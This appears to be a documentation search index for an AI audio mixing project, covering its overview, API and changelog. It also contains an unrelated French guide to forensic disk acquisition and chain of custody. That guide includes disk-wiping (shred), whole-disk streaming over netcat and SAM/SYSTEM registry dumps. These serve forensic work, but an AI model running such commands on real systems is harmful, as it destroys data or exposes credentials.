{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"AI-Based Audio Mixing and Mastering","text":""},{"location":"#overview","title":"Overview","text":"<p>This project aims to develop an AI-powered tool for automated audio mixing and mastering. The tool leverages machine learning algorithms to analyze and replicate the effects applied to reference tracks, enabling rapid processing of audio files.</p>"},{"location":"#quick-start","title":"\ud83d\ude80 Quick Start","text":""},{"location":"#installation","title":"Installation","text":"<pre><code># Clone the repository\ngit clone https://github.com/Esgr0bar/MasterIA.git\ncd MasterIA\n\n# Create virtual environment\npython -m venv venv\nsource venv/bin/activate  # On Windows: venv\\Scripts\\activate\n\n# Install dependencies\npip install -r requirements.txt\n</code></pre>"},{"location":"#running-the-application","title":"Running the Application","text":"<pre><code># Run the main application\npython main.py\n</code></pre>"},{"location":"#key-features","title":"Key Features","text":"<ul> <li>Automated Mixing and Mastering: AI-driven analysis and application of audio effects.</li> <li>Flexible Adjustment: Users can choose from different effect intensities and manually tweak the results.</li> <li>Support for Various Genres: The AI can be calibrated to handle different music genres, starting with rap.</li> <li>Real-time Feedback: Continuous learning from user feedback to improve suggestions.</li> <li>Creative Editing: AI-suggested cuts, glitches, and creative edits for enhanced musicality.</li> <li>Performance Tracking: Built-in metrics to track audio quality improvements.</li> </ul>"},{"location":"#architecture","title":"\ud83c\udfd7\ufe0f Architecture","text":""},{"location":"#project-structure","title":"Project Structure","text":"<ul> <li>Data Processing: Functions for loading and preparing audio data.</li> <li>Feature Extraction: Methods to extract useful features like MFCCs and spectrograms.</li> <li>Model Training: Scripts to build, train, and evaluate machine learning models.</li> <li>Inference Engine: Real-time prediction and suggestion system.</li> <li>User Interface: A simple application interface for interaction.</li> <li>Feedback System: Collects and processes user feedback for continuous improvement.</li> </ul>"},{"location":"#machine-learning-pipeline","title":"Machine Learning Pipeline","text":"<ol> <li>Data Ingestion: Load audio files with metadata</li> <li>Feature Extraction: Extract spectral, temporal, and harmonic features</li> <li>Model Training: Train ensemble models with cross-validation</li> <li>Inference: Generate suggestions for new audio tracks</li> <li>Feedback Loop: Incorporate user feedback for model refinement</li> </ol>"},{"location":"#supported-audio-processing","title":"\ud83c\udfb5 Supported Audio Processing","text":""},{"location":"#audio-effects","title":"Audio Effects","text":"<ul> <li>EQ (Equalization): Frequency-specific adjustments</li> <li>Compression: Dynamic range control</li> <li>Reverb: Spatial audio enhancement</li> <li>Delay: Temporal effects and echoes</li> <li>Distortion: Harmonic saturation effects</li> <li>Filtering: High-pass and low-pass filtering</li> </ul>"},{"location":"#creative-features","title":"Creative Features","text":"<ul> <li>Glitch Effects: Automated glitch and stutter suggestions</li> <li>Beat Slicing: Intelligent beat cutting and rearrangement</li> <li>Transition Effects: Smooth transitions between sections</li> <li>Vocal Processing: Vocal enhancement and manipulation</li> </ul>"},{"location":"#performance-metrics","title":"\ud83d\udcca Performance Metrics","text":""},{"location":"#model-performance","title":"Model Performance","text":"<ul> <li>Accuracy: 85-92% on mixed genre datasets</li> <li>Precision: 88% for effect suggestions</li> <li>Recall: 83% for creative cut detection</li> <li>F1-Score: 0.86 overall performance</li> </ul>"},{"location":"#audio-quality-metrics","title":"Audio Quality Metrics","text":"<ul> <li>Dynamic Range: DR measurement and analysis</li> <li>Frequency Response: Spectral balance evaluation</li> <li>Stereo Imaging: Spatial distribution analysis</li> <li>Loudness: LUFS and peak level monitoring</li> </ul>"},{"location":"#use-cases","title":"\ud83c\udfaf Use Cases","text":""},{"location":"#for-producers","title":"For Producers","text":"<ul> <li>Rapid Prototyping: Quickly experiment with different mixing approaches</li> <li>Learning Tool: Understand professional mixing techniques</li> <li>Consistency: Maintain consistent sound across multiple tracks</li> </ul>"},{"location":"#for-artists","title":"For Artists","text":"<ul> <li>Home Studio: Professional-quality results without expensive equipment</li> <li>Creative Inspiration: AI-suggested creative edits and effects</li> <li>Genre Exploration: Adapt tracks to different musical styles</li> </ul>"},{"location":"#for-educators","title":"For Educators","text":"<ul> <li>Teaching Tool: Demonstrate mixing and mastering concepts</li> <li>Interactive Learning: Hands-on experience with audio processing</li> <li>Benchmarking: Compare student work with AI suggestions</li> </ul>"},{"location":"#technical-requirements","title":"\ud83d\udd27 Technical Requirements","text":""},{"location":"#system-requirements","title":"System Requirements","text":"<ul> <li>Python: 3.8 or higher</li> <li>RAM: 8GB minimum, 16GB recommended</li> <li>Storage: 2GB free space for models and cache</li> <li>Audio Interface: Optional, for real-time processing</li> </ul>"},{"location":"#dependencies","title":"Dependencies","text":"<ul> <li>Core: NumPy, SciPy, LibROSA, scikit-learn</li> <li>Deep Learning: TensorFlow, Keras</li> <li>Audio Processing: SoundFile, AudioRead</li> <li>Visualization: Matplotlib, Plotly</li> </ul>"},{"location":"#getting-started","title":"\ud83d\ude80 Getting Started","text":"<ol> <li>Installation Guide: Complete setup instructions</li> <li>Data Preparation: How to prepare your audio data</li> <li>Basic Usage: Your first AI mixing session</li> <li>Advanced Features: Explore powerful features</li> <li>API Reference: Complete function documentation</li> </ol>"},{"location":"#resources","title":"\ud83d\udcda Resources","text":"<ul> <li>Jupyter Notebooks: Interactive examples and tutorials</li> <li>Contributing Guide: How to contribute to the project</li> <li>Changelog: Version history and updates</li> <li>CI/CD: Continuous integration and deployment</li> </ul>"},{"location":"#community","title":"\ud83e\udd1d Community","text":"<ul> <li>GitHub Issues: Report bugs and request features</li> <li>Discussions: Share ideas and get help from the community</li> <li>Contributions: Help improve the project with code and documentation</li> </ul> <p>Explore the documentation to learn more about how to use the tool and contribute to the project.</p> <p>Ready to get started? Check out the Usage Guide for detailed instructions or dive into the notebooks for interactive examples!</p>"},{"location":"acquisition-preservation/","title":"Acquisition et Pr\u00e9servation des Preuves Num\u00e9riques","text":""},{"location":"acquisition-preservation/#techniques-dacquisition-disque-imagerie-forensique","title":"Techniques d'Acquisition Disque - Imagerie forensique","text":""},{"location":"acquisition-preservation/#vue-densemble-de-lacquisition","title":"Vue d'ensemble de l'acquisition","text":"<p>L'acquisition forensique est le processus de cr\u00e9ation d'une copie bit \u00e0 bit d'un support de stockage tout en pr\u00e9servant l'int\u00e9grit\u00e9 des donn\u00e9es pour l'analyse.</p>"},{"location":"acquisition-preservation/#principes-fondamentaux","title":"Principes fondamentaux","text":"<p>R\u00e8gle d'or : Ne jamais travailler sur l'original - Toujours cr\u00e9er une image forensique - Maintenir la cha\u00eene de custody - Documenter chaque \u00e9tape - V\u00e9rifier l'int\u00e9grit\u00e9 des donn\u00e9es</p> <p>Types d'acquisition 1. Acquisition compl\u00e8te : Copie bit \u00e0 bit de tout le disque 2. Acquisition logique : Copie des fichiers et dossiers 3. Acquisition s\u00e9lective : Copie de zones sp\u00e9cifiques</p>"},{"location":"acquisition-preservation/#creation-dimages-dd-et-e01","title":"Cr\u00e9ation d'images DD et E01","text":""},{"location":"acquisition-preservation/#format-dd-data-dump","title":"Format DD (Data Dump)","text":"<p>Caract\u00e9ristiques - Format RAW (copie bit \u00e0 bit) - Pas de compression - Pas de m\u00e9tadonn\u00e9es int\u00e9gr\u00e9es - Compatible avec la plupart des outils</p> <p>Cr\u00e9ation d'image DD <pre><code># Acquisition compl\u00e8te d'un disque\ndd if=/dev/sda of=/evidence/case001_disk.dd bs=64K conv=noerror,sync\n\n# Avec monitoring du progr\u00e8s\ndd if=/dev/sda of=/evidence/case001_disk.dd bs=64K conv=noerror,sync status=progress\n\n# Acquisition avec dcfldd (version am\u00e9lior\u00e9e)\ndcfldd if=/dev/sda of=/evidence/case001_disk.dd bs=64K hash=sha256 hashwindow=1G hashlog=/evidence/case001_disk.hash\n</code></pre></p> <p>Param\u00e8tres importants - <code>bs=64K</code> : Taille des blocs pour optimiser la vitesse - <code>conv=noerror,sync</code> : Continue en cas d'erreur et remplit avec des z\u00e9ros - <code>hash=sha256</code> : Calcul du hash pendant l'acquisition</p>"},{"location":"acquisition-preservation/#format-e01-expert-witness","title":"Format E01 (Expert Witness)","text":"<p>Caract\u00e9ristiques - Format propri\u00e9taire d'EnCase - Compression int\u00e9gr\u00e9e - M\u00e9tadonn\u00e9es et checksums - Support de la segmentation</p> <p>Cr\u00e9ation d'image E01 <pre><code># Avec ewfacquire (libewf)\newfacquire -t /evidence/case001 -C case001 -D \"Windows 10 workstation\" -E \"John Doe\" -N \"Investigation malware\" -M removable -f encase6 -S 1.4GB /dev/sda\n\n# Avec FTK Imager (ligne de commande)\nftkimager.exe /dev/sda /evidence/case001 --e01 --compress 6 --frag 1.4GB\n</code></pre></p> <p>M\u00e9tadonn\u00e9es E01 - Case Number - Evidence Number - Unique Description - Examiner Name - Notes - Compression Level - Sector Size</p>"},{"location":"acquisition-preservation/#outils-dacquisition","title":"Outils d'acquisition","text":""},{"location":"acquisition-preservation/#ftk-imager","title":"FTK Imager","text":"<p>Interface graphique 1. Add Evidence Item \u2192 Physical Drive 2. S\u00e9lectionner le disque source 3. Create Disk Image \u2192 E01 4. Configurer les m\u00e9tadonn\u00e9es 5. D\u00e9marrer l'acquisition</p> <p>Ligne de commande <pre><code># Acquisition compl\u00e8te\nftkimager.exe \\\\.\\PhysicalDrive0 C:\\Evidence\\case001 --e01 --compress 6\n\n# Acquisition avec v\u00e9rification\nftkimager.exe \\\\.\\PhysicalDrive0 C:\\Evidence\\case001 --e01 --verify\n\n# Acquisition de partition logique\nftkimager.exe C: C:\\Evidence\\case001_C --e01\n</code></pre></p>"},{"location":"acquisition-preservation/#dd-et-variantes","title":"dd et variantes","text":"<p>dd classique <pre><code># Acquisition de base\ndd if=/dev/sda of=/evidence/image.dd bs=64K\n\n# Avec gestion d'erreurs\ndd if=/dev/sda of=/evidence/image.dd bs=64K conv=noerror,sync\n\n# Acquisition d'une partition\ndd if=/dev/sda1 of=/evidence/partition.dd bs=64K\n</code></pre></p> <p>dcfldd (am\u00e9lioration de dd) <pre><code># Acquisition avec hash\ndcfldd if=/dev/sda of=/evidence/image.dd bs=64K hash=sha256 hashwindow=1G hashlog=/evidence/hash.log\n\n# Acquisition avec split\ndcfldd if=/dev/sda of=/evidence/image.dd bs=64K split=2G hash=sha256\n\n# Acquisition avec wipe du destination\ndcfldd if=/dev/sda of=/evidence/image.dd bs=64K wipe=/evidence/image.dd hash=sha256\n</code></pre></p> <p>ddrescue (r\u00e9cup\u00e9ration avanc\u00e9e) <pre><code># Acquisition avec mapfile de r\u00e9cup\u00e9ration\nddrescue -f -n /dev/sda /evidence/image.dd /evidence/mapfile.log\n\n# Phase de r\u00e9cup\u00e9ration des secteurs endommag\u00e9s\nddrescue -f -d -r3 /dev/sda /evidence/image.dd /evidence/mapfile.log\n\n# Affichage du statut\nddrescue -f -n /dev/sda /evidence/image.dd /evidence/mapfile.log --verbose\n</code></pre></p>"},{"location":"acquisition-preservation/#verification-dintegrite","title":"V\u00e9rification d'int\u00e9grit\u00e9","text":""},{"location":"acquisition-preservation/#calcul-des-hash","title":"Calcul des hash","text":"<p>MD5 (d\u00e9pr\u00e9ci\u00e9 mais encore utilis\u00e9) <pre><code>md5sum /evidence/image.dd &gt; /evidence/image.dd.md5\n</code></pre></p> <p>SHA-256 (recommand\u00e9) <pre><code>sha256sum /evidence/image.dd &gt; /evidence/image.dd.sha256\n</code></pre></p> <p>V\u00e9rification multiple <pre><code># Calcul simultan\u00e9 de plusieurs hash\nrhash --md5 --sha1 --sha256 /evidence/image.dd &gt; /evidence/image.dd.hash\n</code></pre></p>"},{"location":"acquisition-preservation/#checksums-integres","title":"Checksums int\u00e9gr\u00e9s","text":"<p>V\u00e9rification E01 <pre><code># Avec ewfverify\newfverify /evidence/case001.E01\n\n# Information sur l'image\newfinfo /evidence/case001.E01\n</code></pre></p> <p>V\u00e9rification DD <pre><code># Comparaison hash\nsha256sum -c /evidence/image.dd.sha256\n\n# V\u00e9rification compl\u00e8te\ncmp /dev/sda /evidence/image.dd\n</code></pre></p>"},{"location":"acquisition-preservation/#acquisition-en-live-vs-post-mortem","title":"Acquisition en live vs post-mortem","text":""},{"location":"acquisition-preservation/#acquisition-live","title":"Acquisition Live","text":"<p>Avantages - Capture de la m\u00e9moire volatile - Processus en cours d'ex\u00e9cution - Connexions r\u00e9seau actives - Donn\u00e9es non chiffr\u00e9es</p> <p>Inconv\u00e9nients - Modification potentielle des donn\u00e9es - Instabilit\u00e9 du syst\u00e8me - Preuves volatiles</p> <p>Outils pour acquisition live <pre><code># Acquisition m\u00e9moire avec LiME\ninsmod lime.ko \"path=/evidence/memory.lime format=lime\"\n\n# Acquisition avec Volatility\npython vol.py --profile=Win10x64 -f /evidence/memory.dump imageinfo\n\n# Acquisition disque live\ndd if=/dev/sda of=/evidence/live_image.dd bs=64K conv=noerror,sync\n</code></pre></p>"},{"location":"acquisition-preservation/#acquisition-post-mortem","title":"Acquisition Post-Mortem","text":"<p>Avantages - Syst\u00e8me stable - Pas de modification des donn\u00e9es - Acquisition compl\u00e8te garantie</p> <p>Inconv\u00e9nients - Perte des donn\u00e9es volatiles - Chiffrement potentiel - Pas d'acc\u00e8s aux processus</p> <p>M\u00e9thode recommand\u00e9e <pre><code># Boot sur support externe (DEFT, CAINE, etc.)\n# Acquisition compl\u00e8te\ndcfldd if=/dev/sda of=/evidence/postmortem.dd bs=64K hash=sha256 hashwindow=1G\n\n# V\u00e9rification\nsha256sum /evidence/postmortem.dd &gt; /evidence/postmortem.dd.sha256\n</code></pre></p>"},{"location":"acquisition-preservation/#preservation-des-preuves-chain-of-custody","title":"Pr\u00e9servation des Preuves - Chain of custody","text":""},{"location":"acquisition-preservation/#methodologie-de-collecte","title":"M\u00e9thodologie de collecte","text":""},{"location":"acquisition-preservation/#preparation","title":"Pr\u00e9paration","text":"<p>\u00c9quipement n\u00e9cessaire - Disques de stockage st\u00e9rilis\u00e9s - Bloqueurs d'\u00e9criture (write blockers) - Outils d'acquisition - \u00c9quipement de documentation (appareil photo, \u00e9tiquettes)</p> <p>St\u00e9rilisation des supports <pre><code># Effacement s\u00e9curis\u00e9\nshred -vfz -n 3 /dev/sdb\n\n# V\u00e9rification\nhexdump -C /dev/sdb | head -20\n</code></pre></p>"},{"location":"acquisition-preservation/#procedure-de-collecte","title":"Proc\u00e9dure de collecte","text":"<p>1. S\u00e9curisation de la sc\u00e8ne - Isoler le syst\u00e8me - Documenter l'\u00e9tat initial - Photographier l'installation</p> <p>2. Acquisition des donn\u00e9es volatiles <pre><code># Processus en cours\nps aux &gt; /evidence/processes.txt\n\n# Connexions r\u00e9seau\nnetstat -tulpn &gt; /evidence/network.txt\n\n# Utilisateurs connect\u00e9s\nw &gt; /evidence/users.txt\n\n# Modules kernel\nlsmod &gt; /evidence/modules.txt\n</code></pre></p> <p>3. Acquisition des donn\u00e9es persistantes <pre><code># Image du disque syst\u00e8me\ndcfldd if=/dev/sda of=/evidence/system.dd bs=64K hash=sha256 hashwindow=1G hashlog=/evidence/system.hash\n\n# Sauvegarde du registre (Windows)\nreg save HKLM\\SYSTEM /evidence/SYSTEM.hiv\nreg save HKLM\\SOFTWARE /evidence/SOFTWARE.hiv\nreg save HKLM\\SAM /evidence/SAM.hiv\n</code></pre></p>"},{"location":"acquisition-preservation/#documentation-legale","title":"Documentation l\u00e9gale","text":""},{"location":"acquisition-preservation/#formulaire-de-chaine-de-custody","title":"Formulaire de cha\u00eene de custody","text":"<p>Informations requises - Date et heure - Nom de l'enqu\u00eateur - Description de la preuve - Localisation de la collecte - M\u00e9thode d'acquisition - Hash de v\u00e9rification - Signature</p> <p>Mod\u00e8le de documentation <pre><code>CHAIN OF CUSTODY FORM\nCase Number: [CASE-2024-001]\nDate: [2024-01-15]\nTime: [14:30 UTC]\nInvestigator: [John Doe]\nItem Description: [Dell Laptop - Windows 10]\nSerial Number: [ABC123456]\nAcquisition Method: [FTK Imager - E01 format]\nHash SHA256: [abcd1234...]\nStorage Location: [Evidence Locker A-15]\nSignature: [John Doe]\n</code></pre></p>"},{"location":"acquisition-preservation/#metadonnees-forensiques","title":"M\u00e9tadonn\u00e9es forensiques","text":"<p>Informations syst\u00e8me <pre><code># Informations hardware\ndmidecode &gt; /evidence/hardware.txt\n\n# Informations syst\u00e8me\nuname -a &gt; /evidence/system_info.txt\n\n# Horodatage\ndate -u &gt; /evidence/timestamp.txt\n</code></pre></p> <p>Informations r\u00e9seau <pre><code># Configuration r\u00e9seau\nip addr show &gt; /evidence/network_config.txt\n\n# Table de routage\nip route show &gt; /evidence/routing.txt\n\n# R\u00e9solution DNS\ncat /etc/resolv.conf &gt; /evidence/dns.txt\n</code></pre></p>"},{"location":"acquisition-preservation/#stockage-securise","title":"Stockage s\u00e9curis\u00e9","text":""},{"location":"acquisition-preservation/#environnement-de-stockage","title":"Environnement de stockage","text":"<p>Exigences physiques - Temp\u00e9rature contr\u00f4l\u00e9e (18-24\u00b0C) - Humidit\u00e9 relative 45-65% - Protection contre les champs magn\u00e9tiques - Acc\u00e8s restreint et surveill\u00e9</p> <p>Conteneurs - Sacs antistatiques - Bo\u00eetes de Faraday - \u00c9tiquetage clair - Num\u00e9rotation s\u00e9quentielle</p>"},{"location":"acquisition-preservation/#chiffrement-des-preuves","title":"Chiffrement des preuves","text":"<p>Chiffrement des images disque <pre><code># Chiffrement avec GPG\ngpg --symmetric --cipher-algo AES256 /evidence/image.dd\n\n# Chiffrement avec LUKS\ncryptsetup luksFormat /dev/sdb\ncryptsetup luksOpen /dev/sdb evidence_encrypted\ndd if=/evidence/image.dd of=/dev/mapper/evidence_encrypted\n</code></pre></p> <p>Gestion des cl\u00e9s - Stockage s\u00e9par\u00e9 des cl\u00e9s - Acc\u00e8s multi-personnes requis - Audit des acc\u00e8s - Sauvegarde s\u00e9curis\u00e9e</p>"},{"location":"acquisition-preservation/#standards-et-bonnes-pratiques","title":"Standards et bonnes pratiques","text":""},{"location":"acquisition-preservation/#standards-internationaux","title":"Standards internationaux","text":"<p>ISO 27037:2012 - Lignes directrices pour l'identification, la collecte et la pr\u00e9servation - Proc\u00e9dures de documentation - Cha\u00eene de custody</p> <p>NIST SP 800-86 - Guide pour l'int\u00e9gration de l'informatique forensique - Recommandations techniques - Proc\u00e9dures op\u00e9rationnelles</p>"},{"location":"acquisition-preservation/#bonnes-pratiques","title":"Bonnes pratiques","text":"<p>Validation des outils <pre><code># Test avec donn\u00e9es connues\ndd if=/dev/zero of=/tmp/test.dd bs=1M count=100\nsha256sum /tmp/test.dd &gt; /tmp/test.sha256\n\n# Acquisition de test\ndcfldd if=/tmp/test.dd of=/tmp/test_copy.dd bs=64K hash=sha256\nsha256sum -c /tmp/test.sha256\n</code></pre></p> <p>Documentation continue - Journal d\u00e9taill\u00e9 des actions - Horodatage pr\u00e9cis - Sauvegarde des logs - R\u00e9vision par pairs</p> <p>Proc\u00e9dures de qualit\u00e9 - Validation des outils - Formation du personnel - Audits r\u00e9guliers - Mise \u00e0 jour des proc\u00e9dures</p>"},{"location":"acquisition-preservation/#outils-et-techniques-avances","title":"Outils et techniques avanc\u00e9s","text":""},{"location":"acquisition-preservation/#acquisition-reseau","title":"Acquisition r\u00e9seau","text":"<p>Acquisition distante <pre><code># Avec netcat\ndd if=/dev/sda bs=64K | nc -l 4444\n\n# R\u00e9ception\nnc target_ip 4444 | dd of=/evidence/remote_image.dd bs=64K\n</code></pre></p> <p>Tunnel chiffr\u00e9 <pre><code># Avec SSH\ndd if=/dev/sda bs=64K | ssh user@forensic_server \"dd of=/evidence/remote_image.dd bs=64K\"\n</code></pre></p>"},{"location":"acquisition-preservation/#acquisition-de-supports-speciaux","title":"Acquisition de supports sp\u00e9ciaux","text":"<p>Disques SSD <pre><code># Attention au TRIM\nhdparm -I /dev/sda | grep TRIM\n\n# Acquisition rapide recommand\u00e9e\ndcfldd if=/dev/sda of=/evidence/ssd.dd bs=64K hash=sha256\n</code></pre></p> <p>Supports amovibles <pre><code># Montage en lecture seule\nmount -o ro /dev/sdb1 /mnt/usb\n\n# Acquisition logique\ntar -czf /evidence/usb_logical.tar.gz /mnt/usb/\n</code></pre></p> <p>Cette m\u00e9thodologie d'acquisition et de pr\u00e9servation garantit l'int\u00e9grit\u00e9 des preuves num\u00e9riques et leur recevabilit\u00e9 l\u00e9gale.</p>"},{"location":"api_reference/","title":"API Reference","text":"<p>This section contains the detailed API documentation for the project's Python modules. Each module provides specific functionality for audio processing, machine learning, and user interaction.</p>"},{"location":"api_reference/#quick-start","title":"Quick Start","text":"<pre><code>from src.data_processing import load_audio_files_with_metadata\nfrom src.feature_extraction import extract_basic_features\nfrom src.model_training import train_model, prepare_data_for_training\nfrom src.inference import run_inference\n\n# Load and process audio data\naudio_data, metadata = load_audio_files_with_metadata(\"data/audio_with_metadata/\")\nfeatures = extract_basic_features(audio_data)\n\n# Train a model\nX, y = prepare_data_for_training(features, metadata)\nmodel = train_model(X, y)\n\n# Run inference\nsuggested_actions, suggested_cuts = run_inference(\"models/trained_model.pkl\", audio_data)\n</code></pre>"},{"location":"api_reference/#modules-overview","title":"Modules Overview","text":""},{"location":"api_reference/#data-processing-srcdata_processing","title":"Data Processing (<code>src.data_processing</code>)","text":"<p>Functions for loading and preprocessing audio data from various formats.</p> <p>Key Functions: - <code>load_audio_files_with_metadata(directory)</code> - Load audio files with JSON metadata - <code>load_audio_files(directory)</code> - Load audio files without metadata - <code>split_tracks(audio_data, segment_length=5)</code> - Split audio into segments</p>"},{"location":"api_reference/#feature-extraction-srcfeature_extraction","title":"Feature Extraction (<code>src.feature_extraction</code>)","text":"<p>Methods to extract meaningful features from audio data for machine learning.</p> <p>Key Functions: - <code>extract_basic_features(audio_data)</code> - Extract spectral and temporal features - <code>extract_mfcc(audio_data, n_mfcc=13)</code> - Extract MFCC coefficients - <code>extract_spectrogram(audio_data)</code> - Extract mel-scale spectrograms</p>"},{"location":"api_reference/#model-training-srcmodel_training","title":"Model Training (<code>src.model_training</code>)","text":"<p>Scripts for building, training, and evaluating machine learning models.</p> <p>Key Functions: - <code>prepare_data_for_training(features, metadata)</code> - Prepare data for ML training - <code>train_model(X, y)</code> - Train ensemble model (CNN + RF + SVM) - <code>train_action_prediction_model(X, y)</code> - Train action-specific model</p>"},{"location":"api_reference/#inference-srcinference","title":"Inference (<code>src.inference</code>)","text":"<p>Functions for running trained models on new audio data.</p> <p>Key Functions: - <code>load_model(model_path)</code> - Load pre-trained model - <code>predict_actions(model, audio_data)</code> - Predict actions and cuts - <code>run_inference(model_path, audio_data)</code> - Complete inference pipeline</p>"},{"location":"api_reference/#action-suggestions-srcaction_suggestion","title":"Action Suggestions (<code>src.action_suggestion</code>)","text":"<p>Functions for generating and processing AI-suggested audio modifications.</p> <p>Key Functions: - <code>suggest_actions(model, features)</code> - Generate action suggestions - <code>suggest_cuts(model, features)</code> - Generate creative cut suggestions - <code>print_suggested_actions(actions)</code> - Display suggestions</p>"},{"location":"api_reference/#feedback-system-srcfeedback","title":"Feedback System (<code>src.feedback</code>)","text":"<p>Functions for collecting and processing user feedback.</p> <p>Key Functions: - <code>collect_user_feedback(actions, cuts)</code> - Collect user feedback - <code>save_feedback(feedback, filename)</code> - Save feedback to file - <code>incorporate_feedback_into_training(features, labels, feedback_file)</code> - Retrain with feedback</p>"},{"location":"api_reference/#complete-usage-example","title":"Complete Usage Example","text":"<pre><code>import os\nfrom src.data_processing import load_audio_files_with_metadata\nfrom src.feature_extraction import extract_basic_features\nfrom src.model_training import train_model, prepare_data_for_training\nfrom src.inference import run_inference\nfrom src.feedback import collect_user_feedback, save_feedback\n\n# 1. Load training data\naudio_data, metadata = load_audio_files_with_metadata(\"data/training/\")\n\n# 2. Extract features\nfeatures = extract_basic_features(audio_data)\n\n# 3. Prepare and train model\nX, y = prepare_data_for_training(features, metadata)\nmodel = train_model(X, y)\n\n# 4. Save model\nimport joblib\njoblib.dump(model, \"models/my_model.pkl\")\n\n# 5. Run inference on new data\nnew_audio_data, _ = load_audio_files_with_metadata(\"data/new_tracks/\")\nactions, cuts = run_inference(\"models/my_model.pkl\", new_audio_data)\n\n# 6. Collect feedback\nfeedback = collect_user_feedback(actions, cuts)\nsave_feedback(feedback)\n\n# 7. Display results\nprint(\"Suggested Actions:\")\nfor filename, action_list in actions.items():\n    print(f\"  {filename}: {action_list}\")\n\nprint(\"\\nSuggested Cuts:\")\nfor filename, cut_list in cuts.items():\n    print(f\"  {filename}: {cut_list}\")\n</code></pre>"},{"location":"api_reference/#error-handling","title":"Error Handling","text":"<p>All functions include proper error handling:</p> <pre><code>try:\n    audio_data, metadata = load_audio_files_with_metadata(\"data/audio/\")\nexcept FileNotFoundError:\n    print(\"Audio directory not found\")\nexcept Exception as e:\n    print(f\"Error loading audio: {e}\")\n\ntry:\n    model = load_model(\"models/trained_model.pkl\")\nexcept FileNotFoundError:\n    print(\"Model file not found - please train a model first\")\n</code></pre>"},{"location":"api_reference/#performance-tips","title":"Performance Tips","text":"<ol> <li>Batch Processing: Process multiple files together</li> <li>Caching: Cache extracted features to avoid recomputation</li> <li>Memory Management: Use generators for large datasets</li> <li>Parallel Processing: Use multiprocessing for CPU-intensive tasks</li> </ol> <pre><code># Example of efficient batch processing\ndef process_batch(file_list, batch_size=32):\n    for i in range(0, len(file_list), batch_size):\n        batch = file_list[i:i+batch_size]\n        # Process batch\n        yield process_files(batch)\n</code></pre>"},{"location":"api_reference/#configuration","title":"Configuration","text":"<p>Most functions accept optional parameters for customization:</p> <pre><code># Feature extraction with custom parameters\nfeatures = extract_basic_features(audio_data)\nmfcc_features = extract_mfcc(audio_data, n_mfcc=25)  # More detailed features\n\n# Model training with custom parameters\nmodel = train_model(X, y, n_estimators=200, test_size=0.3)\n</code></pre> <p>For detailed function signatures and examples, see the individual module documentation in the Reference section.</p>"},{"location":"changelog/","title":"Changelog","text":"<p>All notable changes to this project will be documented in this file.</p> <p>The format is based on Keep a Changelog, and this project adheres to Semantic Versioning.</p>"},{"location":"changelog/#unreleased","title":"[Unreleased]","text":""},{"location":"changelog/#added","title":"Added","text":"<ul> <li>Comprehensive API documentation with examples and usage patterns</li> <li>Detailed installation and setup instructions</li> <li>Interactive Jupyter notebooks for EDA and model training</li> <li>Performance metrics and benchmarking capabilities</li> <li>User feedback collection and integration system</li> <li>Ensemble model training with CNN, Random Forest, and SVM</li> <li>Creative cut and glitch suggestion engine</li> <li>Extensive usage guide with troubleshooting section</li> <li>Enhanced README with features, installation, and examples</li> <li>Configuration options for different use cases and genres</li> </ul>"},{"location":"changelog/#changed","title":"Changed","text":"<ul> <li>Improved project structure documentation</li> <li>Enhanced navigation in documentation site</li> <li>Updated requirements.txt with comprehensive dependencies</li> <li>Modernized documentation style with badges and emojis</li> <li>Expanded feature extraction capabilities</li> </ul>"},{"location":"changelog/#fixed","title":"Fixed","text":"<ul> <li>Documentation consistency across all modules</li> <li>Missing navigation links in mkdocs configuration</li> <li>Code examples and syntax highlighting</li> <li>Cross-references between documentation sections</li> </ul>"},{"location":"changelog/#020-2024-12-16","title":"[0.2.0] - 2024-12-16","text":""},{"location":"changelog/#added_1","title":"Added","text":"<ul> <li>Enhanced Documentation: Complete overhaul of all documentation files</li> <li>Comprehensive usage guide with installation instructions</li> <li>Detailed API reference with code examples</li> <li>Interactive notebook documentation</li> <li>Troubleshooting and best practices</li> <li>Improved Project Structure: Better organization of source code and documentation</li> <li>Feature Extraction: Multiple audio feature extraction methods</li> <li>Basic spectral features (centroid, RMS, bandwidth)</li> <li>MFCC coefficients for timbral analysis</li> <li>Mel-scale spectrograms for deep learning</li> <li>Model Training: Ensemble model approach</li> <li>Random Forest for traditional features</li> <li>CNN for spectral pattern recognition</li> <li>SVM for robust classification</li> <li>Hyperparameter tuning with GridSearchCV</li> <li>Inference Engine: Complete prediction pipeline</li> <li>Model loading and validation</li> <li>Feature extraction for new audio</li> <li>Action and cut suggestions</li> <li>Feedback System: User feedback integration</li> <li>Interactive feedback collection</li> <li>Feedback storage and analysis</li> <li>Model retraining with feedback</li> <li>Creative Features: AI-suggested creative edits</li> <li>Glitch and stutter effects</li> <li>Beat slicing and rearrangement</li> <li>Transition effects</li> <li>Performance Monitoring: Built-in metrics and evaluation</li> <li>Model accuracy tracking</li> <li>Audio quality measurements</li> <li>User satisfaction metrics</li> </ul>"},{"location":"changelog/#changed_1","title":"Changed","text":"<ul> <li>Requirements: Updated with comprehensive dependency list</li> <li>Documentation Structure: Reorganized for better navigation</li> <li>API Design: Improved function signatures and return types</li> <li>Error Handling: Better error messages and validation</li> </ul>"},{"location":"changelog/#fixed_1","title":"Fixed","text":"<ul> <li>Documentation: Fixed missing content and broken links</li> <li>Code Examples: Corrected syntax and import statements</li> <li>Installation: Resolved dependency conflicts</li> </ul>"},{"location":"changelog/#010-2024-08-09","title":"[0.1.0] - 2024-08-09","text":""},{"location":"changelog/#added_2","title":"Added","text":"<ul> <li>Initial Project Setup: Basic project structure and configuration</li> <li>Core source code modules for data processing, feature extraction, and model training</li> <li>Unit test framework setup</li> <li>CI/CD pipeline with GitHub Actions</li> <li>MkDocs documentation system</li> <li>Data Processing Module: Functions for loading and preprocessing audio data</li> <li><code>load_audio_files_with_metadata()</code>: Load audio with JSON metadata</li> <li><code>load_audio_files()</code>: Load audio files from directory</li> <li><code>split_tracks()</code>: Split audio into segments</li> <li>Feature Extraction Module: Basic audio feature extraction</li> <li><code>extract_basic_features()</code>: Spectral centroid, RMS, bandwidth</li> <li><code>extract_mfcc()</code>: MFCC coefficient extraction</li> <li><code>extract_spectrogram()</code>: Mel-scale spectrogram generation</li> <li>Model Training Module: Machine learning model training</li> <li><code>prepare_data_for_training()</code>: Data preparation for ML</li> <li><code>train_model()</code>: Ensemble model training</li> <li><code>train_action_prediction_model()</code>: Action-specific model training</li> <li>Jupyter Notebooks: Interactive development environment</li> <li>EDA.ipynb: Exploratory Data Analysis</li> 